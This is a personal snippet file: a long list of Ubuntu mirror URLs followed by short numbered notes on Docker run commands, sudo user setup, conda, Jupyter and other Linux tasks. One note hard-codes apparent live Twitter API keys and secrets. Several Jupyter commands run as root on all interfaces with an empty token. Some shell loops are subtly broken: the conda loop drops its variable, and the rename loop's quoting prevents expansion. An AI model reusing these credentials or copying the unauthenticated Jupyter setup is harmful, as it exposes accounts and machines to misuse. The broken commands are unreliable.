http://mirror.waia.asn.au/ubuntu/
http://ubuntu.melbourneitmirror.net/archive/
http://ubuntu.mirror.solnode.io/ubuntu/
http://ftp.iinet.net.au/pub/ubuntu/
http://mirror.as24220.net/pub/ubuntu-archive/
http://mirror.as24220.net/pub/ubuntu/
http://mirror.intergrid.com.au/ubuntu/
http://mirror.internode.on.net/pub/ubuntu/ubuntu/
http://mirror.netspace.net.au/pub/ubuntu/
http://mirror.overthewire.com.au/ubuntu/
http://mirror.tcc.wa.edu.au/ubuntu/
http://ubuntu.mirror.digitalpacific.com.au/archive/
http://ubuntu.mirror.serversaustralia.com.au/ubuntu/
http://ubuntu.inode.at/ubuntu/
http://mirror.kumi.systems/ubuntu/
http://mirror.reismil.ch/ubuntu/
http://ubuntu.lagis.at/ubuntu/
http://ubuntu.uni-klu.ac.at/ubuntu/
http://mirror.datacenter.az/ubuntu/
http://mirror.dhakacom.com/ubuntu/
http://mirror.dhakacom.com/ubuntu-archive/
http://mirror.xeonbd.com/ubuntu-archive/
http://ftp.byfly.by/ubuntu/
http://mirror.datacenter.by/ubuntu/
http://ftp.belnet.be/ubuntu.com/ubuntu/
http://be.mirror.guru/ubuntu/
http://mirror.unix-solutions.be/ubuntu/
http://gaosu.rave.org/ubuntu/
http://archive.ubuntu.mirror.ba/ubuntu/
http://mirror.retentionrange.co.bw/ubuntu/
http://mirror.ufscar.br/ubuntu/
http://ubuntu.c3sl.ufpr.br/ubuntu/
http://mirror.globo.com/ubuntu/archive/
http://ubuntu.ufam.edu.br/ubuntu/
http://mirror.unesp.br/ubuntu/
http://sft.if.usp.br/ubuntu/
http://ubuntu-archive.locaweb.com.br/ubuntu/
http://ubuntu.ipacct.com/ubuntu/
http://mirrors.neterra.net/ubuntu/
http://mirror.telepoint.bg/ubuntu/
http://ubuntu.uni-sofia.bg/ubuntu/
http://mirror.csclub.uwaterloo.ca/ubuntu/
http://muug.ca/mirror/ubuntu/
http://ubuntu.ca-west.mirror.fullhost.io/ubuntu/
http://ubuntu.mirror.iweb.ca/
http://archive.ubuntu.mirror.rafal.ca/ubuntu/
http://mirror.clibre.uqam.ca/ubuntu/
http://mirror.it.ubc.ca/ubuntu/
http://mirror.its.sfu.ca/mirror/ubuntu/
http://ubuntu-mirror.jbstuff.net/ubuntu/
http://ubuntu.bhs.mirrors.ovh.net/ubuntu/
http://ubuntu.mirror.globo.tech/
http://gpl.savoirfairelinux.net/pub/mirrors/ubuntu/
http://mirror.cedille.club/ubuntu/
http://mirror.its.dal.ca/ubuntu/
http://ubuntu.mirror.rafal.ca/ubuntu/
http://mirror.uchile.cl/ubuntu/
http://ftp.tecnoera.com/ubuntu/
http://mirrors.cloud.linets.cl/ubuntu/
http://mirrors.aliyun.com/ubuntu/
http://mirrors.shu.edu.cn/ubuntu/
http://ftp.sjtu.edu.cn/ubuntu/
http://mirrors.cn99.com/ubuntu/
http://mirrors.sohu.com/ubuntu/
http://mirrors.tuna.tsinghua.edu.cn/ubuntu/
http://mirrors.ustc.edu.cn/ubuntu/
http://mirrors.yun-idc.com/ubuntu/
http://mirror.lzu.edu.cn/ubuntu/
http://mirrors.cqu.edu.cn/ubuntu/
http://mirrors.njupt.edu.cn/ubuntu/
http://mirrors.xjtu.edu.cn/ubuntu/
http://mirror.edatel.net.co/ubuntu/
http://mirror.upb.edu.co/ubuntu/
http://ubuntu.uniminuto.edu/ubuntu/
http://ubuntu.ucr.ac.cr/ubuntu/
http://hr.archive.ubuntu.com/ubuntu/
http://mirror.library.ucy.ac.cy/linux/ubuntu/archive/
http://mirror.vutbr.cz/ubuntu/archive/
http://cz.archive.ubuntu.com/ubuntu/
http://mirror.dkm.cz/ubuntu/
http://ftp.cvut.cz/ubuntu/
http://ftp.sh.cvut.cz/ubuntu/
http://ucho.ignum.cz/ubuntu/
http://mirror.easyspeedy.com/ubuntu/
http://ubuntu.mirror.iodc.dk/ubuntu/
http://mirror.one.com/ubuntu/
http://mirrors.dotsrc.org/ubuntu/
http://ftp.klid.dk/ftp/ubuntu/
http://mirror.netsite.dk/ubuntu/archive/
http://mirror.cedia.org.ec/ubuntu/
http://mirror.espol.edu.ec/ubuntu/
http://ftp.estpak.ee/ubuntu/
http://ftp.aso.ee/ubuntu/
http://mirrors.nic.funet.fi/ubuntu/
http://www.nic.funet.fi/pub/mirrors/archive.ubuntu.com/
http://ubuntu.trumpetti.atm.tut.fi/ubuntu/
http://bouyguestelecom.ubuntu.lafibre.info/ubuntu/
http://ubuntu.mirrors.ovh.net/ubuntu/
http://mirror.plusserver.com/ubuntu/ubuntu/
http://ubuntu.mirror.serverloft.de/ubuntu/
http://ftp.rezopole.net/ubuntu/
http://mirror.guru/ubuntu/
http://mirror.ubuntu.ikoula.com/ubuntu/
http://mirrors.ircam.fr/pub/ubuntu/archive/
http://ubuntu.univ-nantes.fr/ubuntu/
http://www-ftp.lip6.fr/pub/linux/distributions/Ubuntu/archive/
http://wwwftp.ciril.fr/pub/linux/ubuntu/archives/
http://distrib-coffee.ipsl.jussieu.fr/pub/linux/ubuntu/
http://ubuntu.univ-reims.fr/ubuntu/
http://pf.archive.ubuntu.com/ubuntu/
http://ubuntu.grena.ge/ubuntu/
http://ge.archive.ubuntu.com/ubuntu/
http://ftp.halifax.rwth-aachen.de/ubuntu/
http://ubuntu.mirror.lrz.de/ubuntu/
http://debian.charite.de/ubuntu/
http://ftp.stw-bonn.de/ubuntu/
http://ftp.uni-stuttgart.de/ubuntu/
http://mirror.de.leaseweb.net/ubuntu/
http://mirror.wtnet.de/ubuntu/
http://pubmirror01.lwlcom.net/ubuntu/
http://ubuntu.mirror.tudos.de/ubuntu/
http://ftp.fau.de/ubuntu/
http://mirror.23media.de/ubuntu/
http://ftp-stud.hs-esslingen.de/ubuntu/
http://ftp.uni-kl.de/pub/linux/ubuntu/
http://mirror.netcologne.de/ubuntu/
http://mirror.serverloft.eu/ubuntu/ubuntu/
http://artfiles.org/ubuntu.com/
http://ftp.rrzn.uni-hannover.de/pub/mirror/linux/ubuntu/
http://ftp.rz.tu-bs.de/pub/mirror/ubuntu-packages/
http://ftp.tu-chemnitz.de/pub/linux/ubuntu-ports/
http://ftp.tu-ilmenau.de/mirror/ubuntu/
http://ftp.uni-bayreuth.de/linux/ubuntu/ubuntu/
http://ftp.uni-mainz.de/ubuntu/
http://ftp5.gwdg.de/pub/linux/debian/ubuntu/
http://linux.mirrorhost.pw/ubuntu/
http://mirror.stw-aachen.de/ubuntu/
http://mirror.daniel-jost.net/ubuntu/
http://mirror.ratiokontakt.de/mirror/ubuntu/
http://mirror.tuxcall.de/ubuntu-archive/
http://mirror2.tuxinator.org/ubuntu/
http://vesta.informatik.rwth-aachen.de/ftp/pub/Linux/ubuntu/ubuntu/
http://suse.uni-leipzig.de/pub/releases.ubuntu.com/ubuntu/
http://ubuntu.unitedcolo.de/ubuntu/
http://ftp.hosteurope.de/mirror/archive.ubuntu.com/
http://ubuntu.cybertips.info/ubuntu/
http://ftp.tu-chemnitz.de/pub/linux/ubuntu/
http://de.archive.ubuntu.com/ubuntu/
http://de2.archive.ubuntu.com/ubuntu/
http://ftp.cc.uoc.gr/mirrors/linux/ubuntu/packages/
http://ftp.ntua.gr/ubuntu/
http://ubuntu.otenet.gr/
http://mirror.greennet.gl/ubuntu/
http://ftp.cuhk.edu.hk/pub/Linux/ubuntu/
http://hu.mirror.guru/ubuntu/
http://ftp.kfki.hu/linux/ubuntu/
http://mirror.atomki.mta.hu/ubuntu/
http://ftp.freepark.org/ubuntu/
http://speglar.simnet.is/ubuntu/
http://ubuntu.hysing.is/ubuntu/
http://mirrors.piconets.webwerks.in/ubuntu-mirror/ubuntu/
http://del-mirrors.extreme-ix.org/ubuntu/
http://mirror.cse.iitk.ac.in/ubuntu/
http://ubuntu.mirror.snu.edu.in/ubuntu/
http://ftp.iitm.ac.in/ubuntu/
http://mirror.pramati.com/ubuntu/
http://buaya.klas.or.id/ubuntu/
http://kambing.ui.ac.id/ubuntu/
http://kartolo.sby.datautama.net.id/ubuntu/
http://kebo.pens.ac.id/ubuntu/
http://mirror.delorahosting.com/ubuntu/
http://mirror.unej.ac.id/ubuntu/
http://mirror.poliwangi.ac.id/ubuntu/
http://suro.ubaya.ac.id/ubuntu/
http://repo.unpatti.ac.id/ubuntu/
http://ubuntu.repo.unpas.ac.id/ubuntu/
http://ubuntu.hostiran.ir/ubuntuarchive/
http://ubuntu.asis.io/
http://mirror.rasanegar.com/ubuntu/archive/
http://mirror.aminidc.com/ubuntu/
http://mirror.faraso.org/ubuntu/
http://ubuntu-mirror.parsdev.net/ubuntu-archive/
http://ubuntu.parspack.com/ubuntu/
http://fastmirror.ir/ubuntu/
http://mirror.iranserver.com/ubuntu/
http://repo.iut.ac.ir/repo/Ubuntu/
http://ftp.heanet.ie/pub/ubuntu/
http://mirror.isoc.org.il/pub/ubuntu/
http://it-mirrors.evowise.com/ubuntu/
http://ubuntu.connesi.it/ubuntu/
http://ubuntu.mirror.garr.it/ubuntu/
http://mirror.crazynetwork.it/ubuntu/archive/
http://giano.com.dist.unige.it/ubuntu/
http://linux.yz.yamagata-u.ac.jp/ubuntu/
http://ftp.jaist.ac.jp/pub/Linux/ubuntu/
http://ftp.riken.jp/Linux/ubuntu/
http://ftp.tsukuba.wide.ad.jp/Linux/ubuntu/
http://mirror.fairway.ne.jp/ubuntu/
http://ubuntutym.u-toyama.ac.jp/ubuntu/
http://ubuntu-ashisuto.ubuntulinux.jp/ubuntu/
http://mirror.neolabs.kz/ubuntu/
http://ubuntu.mirror.ac.ke/ubuntu/
http://kr.archive.ubuntu.com/ubuntu/
http://ftp.neowiz.com/ubuntu/
http://ftp.lanet.kr/ubuntu/
http://ubuntu.archive.kw.zain.com/
http://repo.gust.edu.kw/ubuntu/
http://ubuntu-arch.linux.edu.lv/ubuntu/
http://ubuntu.koyanet.lv/ubuntu/
http://mirror.vpsnet.com/ubuntu/
http://ubuntu-archive.mirror.serveriai.lt/
http://ubuntu.mirror.vu.lt/ubuntu/
http://ftp.litnet.lt/ubuntu/
http://ubuntu.mirror.root.lu/ubuntu/
http://mirror.blizoo.mk/ubuntu/
http://mirror.t-home.mk/ubuntu/
http://ubuntu.dts.mg/ubuntu/
http://ubuntu.ipserverone.com/ubuntu/
http://archive.tunnelbiz.com/ubuntu/
http://ubuntu.tuxuri.com/ubuntu/
http://mirror.as43289.net/ubuntu/
http://mirror.datacenter.mn/ubuntu/
http://ubuntu-archive.adsolux.com/ubuntu/
http://download.nust.na/pub/ubuntu/ubuntu/
http://ubuntu.ntc.net.np/ubuntu/
http://mirror.nl.10gbps.io/ubuntu/
http://nl.archive.ubuntu.com/ubuntu/
http://ftp.nluug.nl/os/Linux/distr/ubuntu/
http://ftp.snt.utwente.nl/pub/os/linux/ubuntu/
http://mirror.i3d.net/pub/ubuntu/
http://mirror.nforce.com/pub/linux/ubuntu/
http://mirror.vpgrp.io/ubuntu/
http://ubuntu.mirror.cambrium.nl/ubuntu/
http://mirror.dataone.nl/ubuntu-archive/
http://mirror.nl.leaseweb.net/ubuntu/
http://mirror.transip.net/ubuntu/ubuntu/
http://mirror.amsiohosting.net/archive.ubuntu.com/
http://nl3.archive.ubuntu.com/ubuntu/
http://ftp.tudelft.nl/archive.ubuntu.com/
http://mirror.previder.nl/ubuntu/
http://mirrors.noction.com/ubuntu/archive/
http://nl.mirror.guru/ubuntu/
http://osmirror.rug.nl/ubuntu/
http://ubuntu.mirror.true.nl/ubuntu/
http://archive.ubuntu.nautile.nc/ubuntu/
http://ubuntu.lagoon.nc/ubuntu/
http://ftp.citylink.co.nz/ubuntu/
http://ucmirror.canterbury.ac.nz/ubuntu/
http://nz.archive.ubuntu.com/ubuntu/
http://mirror.ng/ubuntu-archive/
http://archive.mirror.blix.com/ubuntu/
http://no.archive.ubuntu.com/ubuntu/
http://ftp.uninett.no/ubuntu/
http://ubuntu.uib.no/archive/
http://mirror.squ.edu.om/ubuntuarchive/
http://mirrors.nayatel.com/ubuntu/
http://repo.inara.pk/ubuntu/
http://mirror.pregi.net/ubuntu/
http://mirror.rise.ph/ubuntu/
http://ftp.icm.edu.pl/pub/Linux/ubuntu/
http://mirror.onet.pl/pub/mirrors/ubuntu/
http://ftp.agh.edu.pl/ubuntu/
http://ubuntu.man.lodz.pl/ubuntu/
http://ubuntu.task.gda.pl/ubuntu/
http://ftp.vectranet.pl/ubuntu/
http://piotrkosoft.net/pub/mirrors/ubuntu/
http://mirrors.up.pt/ubuntu/
http://archive.ubuntumirror.dei.uc.pt/ubuntu/
http://glua.ua.pt/pub/ubuntu/
http://mirrors.nav.ro/ubuntu/
http://mirrors.nxthost.com/ubuntu/
http://ro-mirrors.evowise.com/ubuntu/
http://mirrors.pidginhost.com/ubuntu/
http://mirrors.ulbsibiu.ro/ubuntu/
http://ubuntu.mirrors.linux.ro/archive/
http://mirrors.xservers.ro/ubuntu/
http://ftp.gts.lug.ro/ubuntu/
http://mirror.truenetwork.ru/ubuntu/
http://mirror.corbina.net/ubuntu/
http://mirror.timeweb.ru/ubuntu/
http://mirror.yandex.ru/ubuntu/
http://mirror.logol.ru/ubuntu/
http://rs.mirror.guru/ubuntu/
http://ubuntu.mirror.ftn.uns.ac.rs/archive/
http://mirror.0x.sg/ubuntu/
http://download.nus.edu.sg/mirror/ubuntu/
http://mirror.nus.edu.sg/ubuntu/
http://mirror.vnet.sk/ubuntu/
http://ftp.energotel.sk/pub/linux/ubuntu/archive/
http://tux.rainside.sk/ubuntu/
http://ftp.arnes.si/pub/mirrors/ubuntu/
http://mirror.wiru.co.za/ubuntu/
http://ftp.leg.uct.ac.za/ubuntu/
http://es-mirrors.evowise.com/ubuntu/
http://ftp.udc.es/ubuntu/
http://ubuntu.cica.es/ubuntu/
http://ftp.caliu.cat/pub/distribucions/ubuntu/archive/
http://mirror.tedra.es/ubuntu/
http://softlibre.unizar.es/ubuntu/archive/
http://ubuntu.uc3m.es/ubuntu/
http://ubuntu.grn.cat/ubuntu/
http://ftp.acc.umu.se/ubuntu/
http://ubuntu.mirror.su.se/ubuntu/
http://ftp.lysator.liu.se/ubuntu/
http://mirror.zetup.net/ubuntu/
http://archive.ubuntu.csg.uzh.ch/ubuntu/
http://mirror.switch.ch/ftp/mirror/ubuntu/
http://ubuntu.digitalsuisse.com/
http://ubuntu.ethz.ch/ubuntu/
http://pkg.adfinis-sygroup.ch/ubuntu/
http://free.nchc.org.tw/ubuntu/
http://debian.linux.org.tw/ubuntu/
http://ftp.ubuntu-tw.net/ubuntu/
http://ftp.cs.pu.edu.tw/Linux/Ubuntu/Archive/
http://ftp.cs.pu.edu.tw/Linux/Ubuntu/ubuntu/
http://ftp.nsysu.edu.tw/Ubuntu/ubuntu/
http://ftp.tku.edu.tw/ubuntu/
http://ftp.yzu.edu.tw/ubuntu/
http://ftp.ntou.edu.tw/ubuntu/
http://ubuntu.cs.nctu.edu.tw/ubuntu/
http://ubuntu.stu.edu.tw/ubuntu/
http://mirror01.idc.hinet.net/ubuntu/
http://mirrors.eastera.tj/ubuntu/
http://mirror.aptus.co.tz/pub/ubuntuarchive/
http://deb-mirror.habari.co.tz/ubuntu/
http://mirrors.bangmod.cloud/ubuntu/
http://mirror.kku.ac.th/ubuntu/
http://mirror.softcontrol.net/ubuntu/
http://mirror.thaidns.co.th/ubuntu/
http://mirror1.ku.ac.th/ubuntu/
http://mirror1.totbb.net/ubuntu/
http://mirrors.psu.ac.th/ubuntu/
http://ubuntu.mirror.tn/ubuntu/
http://ftp.linux.org.tr/ubuntu/
http://mirror.idealhosting.net.tr/ubuntu/
http://mirror.muvhost.com/ubuntu/
http://mirror.ni.net.tr/ubuntu/
http://ubuntu.gnu.gen.tr/ubuntu/
http://ubuntu.saglayici.com/ubuntu/
http://ubuntu.vargonen.com/ubuntu/
http://mirror.renu.ac.ug/ubuntu/
http://ubuntu.colocall.net/ubuntu/
http://ubuntu.volia.net/ubuntu-archive/
http://ubuntu.ip-connect.vn.ua/
http://ubuntu.mirrors.omnilance.com/ubuntu/
http://ua.mirror.guru/ubuntu/
http://mirror.mirohost.net/ubuntu/
http://ubuntu.org.ua/ubuntu/
http://mirror.vorboss.net/ubuntu-archive/
http://www.mirrorservice.org/sites/archive.ubuntu.com/ubuntu/
http://uk-mirrors.evowise.com/ubuntu/
http://ftp.ticklers.org/archive.ubuntu.org/ubuntu/
http://mirror.as29550.net/archive.ubuntu.com/
http://mirror.bytemark.co.uk/ubuntu/
http://mirror.freethought-internet.co.uk/ubuntu/
http://mirror.mythic-beasts.com/ubuntu/
http://mirror.ox.ac.uk/sites/archive.ubuntu.com/ubuntu/
http://mirror.sax.uk.as61049.net/ubuntu/
http://mirror.sov.uk.goscomb.net/ubuntu/
http://repo.bigstepcloud.com/ubuntu/
http://ubuntu.mirrors.uk2.net/ubuntu/
http://archive.ubuntu.com/ubuntu/
http://ubuntu.positive-internet.com/ubuntu/
http://mirror.enzu.com/ubuntu/
http://mirror.genesisadaptive.com/ubuntu/
http://mirror.math.princeton.edu/pub/ubuntu/
http://la-mirrors.evowise.com/ubuntu/
http://mirror.nodesdirect.com/ubuntu/
http://mirror.pnl.gov/ubuntu/
http://mirror.us.leaseweb.net/ubuntu/
http://mirrors.bloomu.edu/ubuntu/
http://mirrors.rit.edu/ubuntu/
http://mirrors.syringanetworks.net/ubuntu-archive/
http://ny-mirrors.evowise.com/ubuntu/
http://repos.forethought.net/ubuntu/
http://ubuntu.cs.utah.edu/ubuntu/
http://ubuntu.mirror.constant.com/
http://mirrors.wikimedia.org/ubuntu/
http://mirror.tocici.com/ubuntu/
http://mirror.atlantic.net/ubuntu/
http://mirror.cc.columbia.edu/pub/linux/ubuntu/archive/
http://mirror.lstn.net/ubuntu/
http://mirrors.advancedhosters.com/ubuntu/
http://mirrors.us.kernel.org/ubuntu/
http://ubuntu.osuosl.org/ubuntu/
http://fireball-public.phys.wvu.edu/mirror/ubuntu/
http://ftp.usf.edu/pub/ubuntu/
http://mirror.cc.vt.edu/pub2/ubuntu/
http://mirror.clarkson.edu/ubuntu/
http://mirror.cogentco.com/pub/linux/ubuntu/
http://mirror.cs.pitt.edu/ubuntu/archive/
http://mirror.jmu.edu/pub/ubuntu/
http://mirror.math.ucdavis.edu/ubuntu/
http://mirror.metrocast.net/ubuntu/
http://mirror.os6.org/ubuntu/
http://mirror.picosecond.org/ubuntu/
http://mirror.sjc02.svwh.net/ubuntu/
http://mirror.steadfast.net/ubuntu/
http://mirror.team-cymru.org/ubuntu/
http://mirror.umd.edu/ubuntu/
http://mirror.us-midwest-1.nexcess.net/ubuntu/
http://mirror.veracruz.co/ubuntu/
http://mirrordenver.fdcservers.net/ubuntu/
http://mirrors.accretive-networks.net/ubuntu/
http://mirrors.arpnetworks.com/Ubuntu/
http://mirrors.cat.pdx.edu/ubuntu/
http://mirrors.easynews.com/linux/ubuntu/
http://mirrors.gigenet.com/ubuntuarchive/
http://mirrors.liquidweb.com/ubuntu/
http://mirrors.lug.mtu.edu/ubuntu/
http://mirrors.maine.edu/ubuntu/
http://mirrors.mit.edu/ubuntu/
http://mirrors.namecheap.com/ubuntu/
http://mirrors.ocf.berkeley.edu/ubuntu/
http://mirrors.sonic.net/ubuntu/
http://mirrors.tripadvisor.com/ubuntu/
http://mirrors.usinternet.com/ubuntu/archive/
http://mirrors.xmission.com/ubuntu/
http://pubmirrors.dal.corespace.com/ubuntu/
http://ubuntu.mirrors.tds.net/pub/ubuntu/
http://ubuntu.mirror.frontiernet.net/ubuntu/
http://ubuntu.mirrors.pair.com/archive/
http://mirror.stjschools.org/public/ubuntu-archive/
http://ubuntuarchive.mirror.nac.net/
http://www.club.cc.cmu.edu/pub/ubuntu/
http://www.gtlib.gatech.edu/pub/ubuntu/
http://archive.linux.duke.edu/ubuntu/
http://cosmos.cites.illinois.edu/pub/ubuntu/
http://ftp.utexas.edu/ubuntu/
http://mirror.ancl.hawaii.edu/linux/ubuntu/
http://mirror.hmc.edu/ubuntu/
http://ubuntu.securedservers.com/
http://us.archive.ubuntu.com/ubuntu/
http://reflector.westga.edu/repos/Ubuntu/archive/
http://ftp.ussg.iu.edu/linux/ubuntu/
http://repo.cure.edu.uy/ubuntu/archivos/
http://mirror.uzcloud.uz/ubuntu/
http://ubuntu.snet.uz/ubuntu/
http://mirror.clearsky.vn/ubuntu/
http://mirror.digistar.vn/ubuntu/
http://mirror.ehost.vn/ubuntu/
http://mirrors.nhanhoa.com/ubuntu/
http://mirrors.vhost.vn/ubuntu/
http://opensource.xtdv.net/ubuntu/
http://mirror.zol.co.zw/ubuntu/

----
id:302

http://wiki.ros.org/docker/Tutorials/GUI
docker gui xhost x11 
Google search - make Dockerfile xhost x11 -

----
id:303

make a new user make user sudo
root@19b929ede00b:/# adduser jack
Adding user jack' (1001) ...
Adding new user jack' ...
Creating home directory /etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for jack
Enter the new value, or press ENTER for the default
Full Name []: jack
Room Number []: 111
Work Phone []: 
Home Phone []: 
Other []: 
Is the information correct? [Y/n] Y
root@19b929ede00b:/# usermod -aG sudo jack
root@19b929ede00b:/# login jack
Password: 
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.15.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

----
id:305
 
docker run -d -p 443:8888 -e 'PASSWORD=password' -v /home/jack/Desktop/Ubuntu16.04/deep-dream-generator:/src ryankennedyio/deepdream
docker run -ti --rm -e DISPLAY=:0.0 -v /tmp/.X11-unix:/tmp/.X11-unix -v /home/jack/Desktop/eclipse-docker:/home/developer -v /home/jack/Desktop/workspace:/workspace jriobello/eclipse:0.1 eclipse
docker run -i -p 9999:9999 -v /home/jack/Desktop/ScriptsWorkspaces/IJS:/data -t nikhilk/ijs:latest
docker run --rm -d -p 8080:80 -v /home/jack/Desktop/NXGIN:/usr/share/nginx/html -d nginx
docker run -p 8765:8765 gundb/gun:latest
docker run -it -p 8888:8888 -v /home/jack/Desktop/notebooks:/notebooks jacknorthrup/py2-torch:latest /bin/sh -c 'cd /notebooks; jupyter notebook --ip="0.0.0.0" --no-browser --allow-root'
docker run --cpuset-cpus='0,1' -v /home/jack/Desktop:/tmp/working -w=/tmp/working --rm -it kaixhin/torch # Start TORCH7 docker with 2 cpu cores
docker run -it -p 8888:8888 -v /home/jack/Desktop/root:/root ufoym/deepo:all-py27-jupyter-cpu jupyter notebook --no-browser --ip=0.0.0.0 --allow-root --NotebookApp.token= --notebook-dir='/root'
docker run -it -p 8888:8888 -v /home/jack/Desktop/root:/root ufoym/deepo:all-py36-jupyter-cpu jupyter notebook --no-browser --ip=0.0.0.0 --allow-root --NotebookApp.token= --notebook-dir='/root'
#docker run --rm -p 8888:8888 -e JUPYTER_ENABLE_LAB=yes -v /home/jack/Desktop:/home/jovyan/work jacknorthrup-data/science:latest
docker run --rm -p 8888:8888 -e JUPYTER_ENABLE_LAB=yes -v /home/jack/Desktop/notebooks:/home/jovyan/work jacknorthrup-data/science:latest            
all the best docker images best images gest dockers
----
id:306
 docker run -v /cv:/home/char-rnn/cv -v /data/my-training-data:/home/char-rnn/data/my-training-data -it jacknorthrup/char-rnn
this docker image jacknorthrup/char-rnn works and generates text.

----
id:307

create new user, create user, user sudo
sudo permission, choose terminal, default terminal
sudo adduser jack
sudo usermod -aG sudo jack
sudo visudo
/etc/sudoers
WHATZup

root    ALL=(ALL:ALL) ALL
newuser ALL=(ALL:ALL) ALL

update-alternatives --config x-terminal-emulator

----
id:308
 
kill pid, kill process, kill pid in container,
kill docker process
docker exec -it <container> ps -aux
sudo docker exec <container> kill -9 <pid>
----
id:309
 
vnc viewer \  xvnc4viewer --listen 5900  \view vnc 

----
id:310

pip install -r requirements.txt
#  Original solution via StackOverflow:
#    http://stackoverflow.com/questions/35802939/install-only-available-packages-using-conda-install-yes-file-requirements-t
#  Install via  directly.
#  This will fail to install all
#  dependencies. If one fails,
#  all dependencies will fail to install.
conda install --yes --file requirements.txt
#  To go around issue above, one can
#  iterate over all lines in the
#  requirements.txt file.
while read requirement; do conda install --yes ; done < requirements.txt

----
id:311

create environment in notebook jupyter env jupyter envs
conda install nb_conda
conda info nb_conda
python -m ipykernel install --user --name  --display-name 'Python(UNIVERSE)'

----
id:312

docker run -p 8888:8888 rmeertens/tensorflowgym

----
id:313

Your MuJoCo computer id is:
LINUX_0A620Dt3SS76i05E1LHT3aiMDGc3242Z5_0hH049
Please send this string to Roboti LLC to generate activation key.

----
id:314

sudo apt-get install libosmesa6-dev
fatal error: GL/osmesa.h: No such file or directory

----
id:315

   error: [Errno 2] No such file or directory: 'patchelf': 'patchelf'
(universe-starter-agent) jack@jack-desktop:~/Desktop/gym/mujoco-py$ sudo apt install patchelf
Reading package lists... Building dependency tree  Reading state information... Done
The following NEW packages will be installed:  patchelf

----
id:316

ac81b9dc4bb1 openai

----
id:317

docker run -i -p 8888:8889 -v /home/jack/Desktop/JupyterNotebook-ijs:/data -t jacknorthrup/nodejs1:latest
nodejs jupyter nodesjs

----
id:318
  
f28c9bce1ae7 docker container of 
jacknorthrup/jupyternode:latest

----
id:319

#!/bin/bash
docker run --name jupet -d -it -p 8888:8888 -v /home/jack/Desktop/JupyterNotebook-ijs/jupyter-nodejs:/home/jovyan/jupyter-nodejs jacknorthrup/jupyternode:latest
docker exec -it jupet bash startup
nodejs docker node docker
----
id:320

https://labs.consol.de/development/2017/09/19/docker-headless-vnc-container-1.2.0-released.html
vcn vnc docker 

----
id:321

(universe) jack@jack-desktop:~/Desktop/JupyterNotebook-ijs$ jupyter pixiedust install
Step 1: PIXIEDUST_HOME: /home/jack/pixiedust
Keep y/n [y]? y
Step 2: SPARK_HOME: /home/jack/pixiedust/bin/spark
Keep y/n [y]? y
Select an existing spark install or create a new one
1. spark-2.2.0-bin-hadoop2.7
2. Create a new spark Install
Enter your selection: 1
downloaded spark cloudant jar: /home/jack/pixiedust/bin/cloudant-spark-v2.0.0-185.jar
Step 3: SCALA_HOME: /home/jack/pixiedust/bin/scala
Keep y/n [y]? y
Select an existing scala install or create a new one
1. scala-2.11.8
2. Create a new scala Install
Enter your selection: 1
Step 4: Kernel Name: Python with Pixiedust (Spark 2.2)
Keep y/n [y]? y
[PixiedustInstall] WARNING | Kernelspec name u'Python with Pixiedust (Spark 2.2)' is invalid: Kernel names can only contain ASCII letters and numbers and these separators: - . _ (hyphen, period, and underscore).
self.kernelInternalName pythonwithpixiedustspark22
[PixiedustInstall] Installed kernelspec pythonwithpixiedustspark22 in /home/jack/.local/share/jupyter/kernels/pythonwithpixiedustspark22
Downloading intro notebooks into /home/jack/pixiedust/notebooks
...https://github.com/ibm-watson-data-lab/pixiedust/raw/master/notebook/PixieDust 1 - Easy Visualizations.ipynb : done
...https://github.com/ibm-watson-data-lab/pixiedust/raw/master/notebook/PixieDust 2 - Working with External Data.ipynb : done
...https://github.com/ibm-watson-data-lab/pixiedust/raw/master/notebook/PixieDust 3 - Scala and Python.ipynb : done
...https://github.com/ibm-watson-data-lab/pixiedust/raw/master/notebook/PixieDust 4 - Add External Spark Packages.ipynb : done
...https://github.com/ibm-watson-data-lab/pixiedust/raw/master/notebook/PixieDust 5 - Stash to Cloudant.ipynb : done
...https://github.com/ibm-watson-data-lab/pixiedust/raw/master/notebook/PixieDust Contribute.ipynb : done
      

####################################################################################################
#Congratulations: Kernel Python with Pixiedust (Spark 2.2) was successfully created in /home/jack/.local/share/jupyter/kernels/pythonwithpixiedustspark22
#You can start the Notebook server with the following command:
#jupyter notebook /home/jack/pixiedust/notebooks
####################################################################################################

----
id:322
  
jupyter notebook /home/jack/pixiedust/notebooks
pixiedust

----
id:323

https://www1.ncdc.noaa.gov/pub/data/swdi/stormevents/csvfiles/
weather data
----
id:324

twitter key password 
def twiter():
    CONSUMER_KEY = 'CeiWVwKXfsNq6tIkJJENJyb5c'
    CONSUMER_SECRET = '1nGYafQxSKudqIi33zNXKdCMbK3Nd5TVhETeah0i0cVTbOs86P'
    ACCESS_KEY = '296906916-dxh34gnW48DJITJb0dkfstrn3qyF8dkaZXFWrIEP'
    ACCESS_SECRET = 'BkMtvPNG4biJBRPxU5qw6CiVgNSYafr2AucwsHpzaQ44d'
    twitter = (CONSUMER_KEY, CONSUMER_SECRET, ACCESS_KEY, ACCESS_SECRET)
    return twitter

----
id:325
ds
----
id:326

netstat -vae >>netstat1.DATA

----
id:327

jquery javascript animation movement graphic effects
https://www.jqueryscript.net/animation/list-15-2.html
best javascript best jquery

----
id:328

make install, result make install, install, 
include location, share,
-- Installing: /usr/local/include/SDL2/SDL_config.h
-- Up-to-date: /usr/local/lib/libSDL2.so
-- Installing: /usr/local/lib/pkgconfig/sdl2.pc
-- Installing: /usr/local/bin/sdl2-config
-- Installing: /usr/local/share/aclocal/sdl2.m4

----
id:329

for f in *\ *; do mv '$f' '${f// /_}'; done
remove white spaces from filenames remove spaces 
----
id:330

clear whitespaces whitespaces 
detox -r vids 
remove whitespace from filenames

----
id:331

pip  install gTTS
Program for conversion will be as shown below.

from gtts import gTTS
tts = gTTS(text='Hello crazy programmer', lang='en')
tts.save('audio.mp3')

Unlike other APIs it will generate an audio and will save 
into the same directory where your program stored.
To play this audio we’ll need another tool to play audio on command line.
If you’re using Linux (eg. Ubuntu) then mpg321 will be best command line player.
To install it open terminal and type this command-

sudo apt-get install mpg321
mpg321 audio.mp3 -quiet

import os     #will be on the top
